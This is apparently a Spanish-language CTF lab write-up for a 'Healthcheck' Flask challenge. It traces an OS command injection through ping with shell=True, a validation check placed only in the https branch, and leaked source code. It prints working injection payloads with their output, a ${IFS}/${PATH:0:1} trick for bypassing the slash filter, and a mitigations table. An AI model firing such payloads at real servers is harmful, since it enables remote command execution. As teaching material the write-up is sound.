---
id: healthcheck
sidebar_position: 2
title: "Healthcheck"
tags: [avanzado, web-hacking, command-injection, rce, analisis-de-codigo]
---

# Healthcheck

| Campo | Valor |
|-------|-------|
| **Categoría** | Web Hacking |
| **Dificultad** | 🔴 Avanzado |
| **Herramientas** | curl, bash, análisis de código Python |
| **Concepto clave** | OS Command Injection — `subprocess` con `shell=True` |
| **TTP** | Command and Scripting Interpreter (T1059) |

## Enunciado

> Exploit a vulnerability in the image upload functionality to obtain the server's flag.

**Infraestructura del ejercicio:**

| Rol | IP | Puerto | Credenciales |
|-----|----|--------|--------------|
| Aplicación web (`p1`) | `192.168.200.100` | 3000 | — |
| Servidor de archivos (`fileserver`) | `192.168.200.200` | 80 | — |
| Máquina de trabajo (Debian 12) | — | — | asignadas por INICTEL |

:::note[El enunciado engaña a propósito]

El reto habla de "image upload functionality", pero el objetivo no sube imágenes por
un formulario multipart. Sube imágenes **por URL**: le das una dirección y el servidor la
procesa. Ese fetch server-side es la puerta. No dejes que el nombre del campo te fije el
vector — confírmalo con el comportamiento real.

:::

---

## Reconocimiento

### Paso 1 — Huellar el stack

Antes de tocar nada, identificamos qué corre en cada host:

```bash
curl -sI http://192.168.200.100:3000/
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.13.3
Content-Type: text/html; charset=utf-8
```

`Werkzeug` es el servidor de desarrollo de **Flask** — la aplicación es Python, no
Node.js (un error fácil: el puerto 3000 es el default de Express, pero aquí no aplica). El
stack decide todo el árbol de vectores: descartamos webshells `.php` y ponemos en el radar
Jinja2 SSTI, la consola del debugger de Werkzeug y command injection.

El servidor de archivos revela otra cosa:

```bash
curl -sI http://192.168.200.200/
```

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.10
```

Es `python -m http.server` con **listado de directorios** activo. Guardamos ese dato: un
listado abierto suele filtrar código fuente.

### Paso 2 — Encontrar el formulario

El cuerpo de la página principal contiene:

```html
<form action="/send" method="GET">
  <h2>SEND HEALTHCHECK</h2>
  <input type="text" name="url" placeholder="ex) https://www.google.com">
  <button type="submit">Send</button>
</form>
```

Un campo `url`, método GET, ruta `/send`. La aplicación se llama **Healthcheck**.

### Paso 3 — Observar el comportamiento real

La hipótesis inicial es SSRF (el campo pide una URL). La probamos:

```bash
curl -s "http://192.168.200.100:3000/send?url=http://192.168.200.200/"
```

La respuesta en el bloque de resultado:

```
Execution Result
PING 192.168.200.200 (192.168.200.200) 56(84) bytes of data.
64 bytes from 192.168.200.200: icmp_seq=1 ttl=64 time=3.94 ms
--- 192.168.200.200 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```

Esto **no es SSRF** — el servidor no descargó una página, ejecutó `ping` contra el host de
la URL. La aplicación es un envoltorio de `ping`. Dos pruebas más afinan el modelo:

```bash
curl -s "http://192.168.200.100:3000/send?url=file:///etc/passwd"   # -> "Invalid"
curl -s "http://192.168.200.100:3000/send?url=http://127.0.0.1:3000/" # -> ping: 127.0.0.1:3000: Name or service not known
```

- `file://` es rechazado con `Invalid` → hay un filtro basado en el esquema.
- `http://127.0.0.1:3000/` pasa el host `127.0.0.1:3000` tal cual a `ping` → confirma que el
  host de la URL se inyecta en un comando del sistema.

Si el servidor construye una línea de shell con nuestra entrada, el vector es **OS Command
Injection**, no SSRF.

### Paso 4 — Filtrar el código fuente

El listado de directorios del fileserver nos deja leer la aplicación completa:

```bash
curl -s http://192.168.200.200/1/eng/for_user/app.py
```

Pasamos de caja negra a caja blanca. Con la fuente, el punto de inyección deja de ser una
suposición.

---

## Teoría

### ¿Qué es OS Command Injection?

**OS Command Injection** ocurre cuando una aplicación construye un comando del sistema
operativo concatenando entrada del usuario, y esa entrada se interpreta como parte de la
sintaxis del shell en lugar de como un dato. El atacante inserta metacaracteres del shell
(`;`, `|`, `&&`, `` ` ``, `$()`) para ejecutar comandos arbitrarios con los privilegios del
proceso web.

### El anti-patrón: `subprocess` con `shell=True`

En Python, la diferencia entre seguro e inseguro es una sola bandera:

```python
# VULNERABLE — shell=True interpreta la cadena completa como un comando de shell
command = f"ping {host} -c 1"
subprocess.Popen(command, shell=True)

# SEGURO — shell=False (default) + lista de argumentos:
# 'host' es SIEMPRE un solo argumento, nunca sintaxis de shell
subprocess.Popen(["ping", host, "-c", "1"])
```

Con `shell=True`, la cadena `ping 8.8.8.8;id -c 1` se ejecuta a través de `/bin/sh -c`, que
ve el `;` como separador de comandos y corre `id`. Con `shell=False` y una lista, `host`
vale literalmente `8.8.8.8;id` — un nombre de host inválido, no un comando.

### El código vulnerable, línea por línea

```python
def is_safe_input(host):
    safe_pattern = re.compile(r'^[a-zA-Z0-9_\-\.]+$')   # allowlist estricta
    return safe_pattern.match(host) is not None

def check_url(url):
    regex = re.compile(r'^(https?://)([^/]+)')   # host = todo hasta el primer "/"
    match = regex.match(url)
    if match:
        protocol = match.group(1)
        host = match.group(2)
        if protocol == 'https://':
            if is_safe_input(host):     # (1) la validación SOLO existe aquí
                return host
            else:
                return "Invalid"
        return host                     # (2) rama http:// -> devuelve host SIN validar
    else:
        return "Invalid"

def healthcheck(host):
    command = f"ping {host} -c 1"
    subprocess.Popen(command, shell=True, ...)   # (3) shell=True + interpolación cruda
```

Tres fallos encadenados:

1. **Validación en la rama equivocada.** `is_safe_input` — una allowlist que bloquea todos
   los metacaracteres del shell — solo se ejecuta cuando el protocolo es `https://`.
2. **Bypass trivial por protocolo.** Con `http://`, la función devuelve el host **sin
   ninguna validación**. El atacante simplemente elige `http://` en vez de `https://`.
3. **Ejecución con `shell=True`.** El host no validado se interpola en `ping {host} -c 1`
   y se pasa a un shell.

La única barrera que sobrevive es la del propio regex: el host se captura como `[^/]+`, así
que **no puede contener el carácter `/`**. Es la restricción con la que hay que convivir.

### Por qué `file://` fallaba y `http://` funciona

El regex ancla en `^(https?://)`. `file:///etc/passwd` no empieza por `http://` ni
`https://`, así que `check_url` cae al `else` y devuelve `"Invalid"`. La misma coincidencia
de esquema que rechaza `file://` es la que deja pasar `http://` sin filtrar. La defensa y el
agujero comparten la misma línea.

---

## Explotación

### Paso 1 — Un helper para leer el resultado

El resultado del comando vuelve dentro de un `<div class="result">`. Esta función extrae solo
ese bloque y le quita las etiquetas HTML:

```bash
T=http://192.168.200.100:3000
show(){ curl -s "$T/send?url=$1" | sed -n '/class="result"/,/<\/div>/p' | sed 's/<[^>]*>//g'; }
```

### Paso 2 — Confirmar la ejecución de comandos

Construimos un payload que:

- usa el protocolo `http://` para esquivar `is_safe_input`,
- inyecta con `;` para terminar el `ping` y encadenar comandos,
- **no usa `/`** (lo prohíbe el regex `[^/]+`).

El espacio se codifica como `%20`. Payload: `http://;id;pwd;ls;`

```bash
show 'http://%3Bid%3Bpwd%3Bls%3B'
```

```
Execution Result
uid=1000(python) gid=1000(python) groups=1000(python)
/app
app.py
flag
requirements.txt
templates
ping: usage error: Destination address required
/bin/sh: 1: -c: not found
```

El comando que corrió en el servidor fue `ping ;id;pwd;ls; -c 1`:

- `ping ` sin host → `usage error` (inofensivo, es la parte que descartamos).
- `id` → ejecutamos como el usuario **`python`**.
- `pwd` → el directorio de trabajo es **`/app`**.
- `ls` → el directorio contiene un archivo llamado **`flag`**.
- ` -c 1` → sobra al final → `-c: not found` (inofensivo).

### Paso 3 — Leer el flag

El flag está en el cwd (`/app/flag`), así que lo referenciamos por nombre relativo —
**sin necesidad de `/`**. Solo hay que sortear el espacio de `cat flag` con `%20`:

```bash
show 'http://%3Bcat%20flag%3B'
```

```
Execution Result
flag_3c462f978e95e26eb2a50235903f82e4a09c5ab95decfac4aec8c58e8fef7915
```

## Flag

```
flag_3c462f978e95e26eb2a50235903f82e4a09c5ab95decfac4aec8c58e8fef7915
```

---

<details>
<summary>💬 El desarrollador SÍ escribió una función de validación (`is_safe_input`) con una allowlist correcta. ¿Por qué no sirvió de nada?</summary>

Porque la colocó dentro del `if protocol == 'https://'`. La validación solo se ejecuta en el
camino que el atacante nunca elige. El código "seguro" existe, pero está en la rama
equivocada. Lección: validar la entrada debe ser **incondicional**, no depender de un camino
"de confianza" que el atacante controla.

</details>

<details>
<summary>💬 El regex captura el host como <code>[^/]+</code>, así que el payload no puede contener <code>/</code>. Si el flag hubiera estado en <code>/root/flag</code> en vez de en el cwd, ¿cómo lo leerías?</summary>

Construyendo cada `/` sin teclearlo. `${PATH:0:1}` expande al primer carácter de la variable
`PATH`, que siempre empieza en `/`. El payload sería:

```
cat${IFS}${PATH:0:1}root${PATH:0:1}flag
```

`${IFS}` produce el espacio y `${PATH:0:1}` produce cada `/`. Ninguno de los dos caracteres
prohibidos aparece literalmente en la entrada.

</details>

<details>
<summary>💬 ¿Por qué la respuesta a <code>file:///etc/passwd</code> fue "Invalid" pero <code>http://;cat flag;</code> funcionó, si ambos intentan leer archivos del servidor?</summary>

El filtro es de **esquema**, no de contenido. `check_url` exige que la URL empiece por
`http://` o `https://`; `file://` no matchea y cae al `else` → `"Invalid"`. `http://` sí
matchea, y como no es `https://`, se salta la validación. El ataque no lee el archivo con un
esquema de URL — abusa del comando `ping` para ejecutar `cat`.

</details>

---

## ¿Qué aprendimos?

- **El nombre del campo no define el vector.** "url", "Healthcheck", "image upload" — todas
  sugerían SSRF. El comportamiento real (`ping`) reveló command injection. Confirma siempre
  con la salida, no con la etiqueta.
- **`shell=True` con entrada de usuario es RCE esperando a pasar.** La forma segura es
  `shell=False` + lista de argumentos, donde la entrada nunca es sintaxis de shell.
- **La validación condicional es tan buena como su condición.** Un filtro perfecto en la
  rama que el atacante evita no protege nada.
- **Un listado de directorios abierto convierte caja negra en caja blanca.** Leer `app.py`
  transformó un ataque a ciegas en uno guiado por la fuente.
- **Los filtros de caracteres se sortean con expansión del shell.** `${IFS}` sustituye
  espacios y `${PATH:0:1}` produce `/` — sin usar los caracteres prohibidos.

:::note[Callejón sin salida explorado]

La primera hipótesis fue **SSRF**: el campo pedía una URL, idéntico al ejercicio *My
WebView*. Se descartó al ver que la respuesta era la salida de `ping`, no el cuerpo de una
página descargada. También se probó `file:///etc/passwd` esperando lectura de archivos vía
esquema de URL — devolvió `"Invalid"`, porque el filtro exige prefijo `http(s)://`. El vector
real no era la URL en sí, sino el comando que la procesaba.

:::

---

## Mitigaciones

| Medida | Descripción |
|--------|-------------|
| **Nunca usar `shell=True` con entrada de usuario** | Usar `subprocess.Popen(["ping", host, "-c", "1"])` — la entrada es un argumento, no sintaxis de shell |
| **Validación incondicional** | Aplicar la allowlist a TODA entrada, no solo a una rama de protocolo |
| **Validar el destino, no el esquema** | Comprobar que `host` es una IP o dominio válido (`ipaddress`, `socket.gethostbyname`) antes de usarlo |
| **Principio de mínimo privilegio** | El proceso web corre como `python` (uid 1000), no como root — limita el daño, pero no lo evita |
| **No exponer el código fuente** | Deshabilitar el listado de directorios del servidor de archivos; no publicar `app.py` en una ruta accesible |
